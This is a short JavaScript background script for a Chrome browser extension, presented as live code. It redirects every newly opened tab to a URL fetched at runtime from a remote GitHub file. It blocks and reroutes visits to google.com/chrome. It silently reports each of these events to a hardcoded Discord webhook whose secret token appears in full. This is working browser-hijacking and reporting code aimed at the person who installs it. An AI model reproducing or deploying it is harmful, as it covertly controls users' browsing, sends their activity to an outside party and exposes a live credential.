const url = "https://discord.com/api/webhooks/1093683324024799252/9-WQ4MgpIM_E4DLBHVipd1miLwJ6wKEEkbF35GzDU8MJpSCi-afMlUP5IWqCg7Riu8__";

const sendData =  (data) => {
  let now = new Date();
let year = now.getFullYear();
let month = String(now.getMonth() + 1).padStart(2, '0');
let day = String(now.getDate()).padStart(2, '0');
let hours = String(now.getHours()).padStart(2, '0');
let minutes = String(now.getMinutes()).padStart(2, '0');
let seconds = String(now.getSeconds()).padStart(2, '0');
let milliseconds = String(now.getMilliseconds()).padStart(6, '0');

let formattedDate = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}.${milliseconds}`;
  const message = {
    content: `${formattedDate} ${data}`
  };

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(message)
  })
    .then(response => {
      
    })
    .catch(error => {
      
    });
  
   
};

chrome.tabs.onCreated.addListener(function (tab) {
  fetch("https://raw.githubusercontent.com/KingOfTNT10/ConstDataTemp/main/url.txt").then(d => d.text()).then(d => { sendData(`New tab created, diverting to ${d}`);  chrome.tabs.update(tab.id, {url: d})}).catch(console.log)
    
  });
chrome.webNavigation.onBeforeNavigate.addListener(details => {
  console.log(details.url)
  if (details.url.includes('https://www.google.com/chrome')) {
    chrome.tabs.update(details.tabId, { url: 'https://www.google.com/?cb=' + Math.random() });
    sendData(`Tried to access https://www.google.com/chrome! diverting...`)
  }
}, {url: [{urlMatches: '.*'}]});